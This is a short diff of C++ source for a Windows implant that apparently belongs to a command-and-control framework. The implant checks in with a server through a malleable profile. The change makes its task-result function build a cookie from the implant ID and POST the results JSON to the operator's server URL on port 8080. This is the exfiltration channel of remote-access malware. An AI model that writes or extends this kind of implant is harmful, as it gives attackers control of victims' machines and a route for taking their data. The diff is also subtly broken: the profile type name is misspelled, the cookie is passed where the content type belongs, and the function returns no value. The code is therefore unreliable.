@@ -76,7 +76,7 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     return parseTask(resDecoded);
 }
 
-bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success)
+bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success, MallableProfile *profile)
 {
     /* Payload format:
     {
@@ -105,10 +105,16 @@ bool SendTaskResult(LPCSTR taskId, LPBYTE results, BOOL success)
     resultsDocument.Accept(writer);
     const char *results_json = buffer.GetString();
 
-    DEBUG_PRINTF()
+    DEBUG_PRINTF("Results JSON: %s\n", results_json);
+
+    // Build auth cookie
+    std::ostringstream oss;
+    oss << "Cookie: " << profile->cookie << "=" << profile->implantId;
+    string authCookieString = oss.str();
+    std::wstring authCookie(authCookieString.begin(), authCookieString.end());
 
     // Send the results
     PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
+    string res = HTTPRequest(L"POST", profile->serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)results_json, strlen(results_json), outSize, FALSE);
     
 }
